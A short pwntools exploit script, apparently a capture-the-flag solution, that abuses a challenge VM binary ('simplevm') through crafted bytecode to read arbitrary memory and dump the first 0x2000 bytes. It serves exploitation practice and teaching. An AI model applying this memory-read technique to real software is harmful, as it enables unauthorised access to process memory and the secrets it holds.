#!/usr/bin/python
from pwn import *

r = process('./simplevm')
#pause()

def set_reg(reg, val):
    global r
    r.readuntil('option--->>')
    r.writeline('4')
    r.writeline("%x" % (reg))
    r.writeline("%x" % (val))

def get_reg(reg):
    global r
    r.readuntil('option--->>')
    r.writeline('5')
    r.readuntil('regid:')
    r.writeline(str(reg))
    d = r.readline()
    #print `d`

    d = int(d.strip(), 16)
    return d

def run_vm():
    global r
    r.readuntil('option--->>')
    r.writeline('1')

def vm_read(addr):
    global r
    set_reg(1, 0x1337)
    set_reg(0x11, 0)

    r.readuntil('option--->>')
    r.writeline('2')
    r.writeline('0')

    sc = '\x0a'  + p8(1) + p32(addr) + p32(0)

    r.writeline(str(len(sc)))
    r.write(sc)

    run_vm()
    d = get_reg(1)
    #print hex(d)
    return d

dmp = ''
for i in xrange(0, 0x1000*2, 4):
    d = vm_read(i)
    print "0x%x: 0x%x" % (i, d)
    dmp += p32(d)

print hexdump(dmp)

r.interactive()
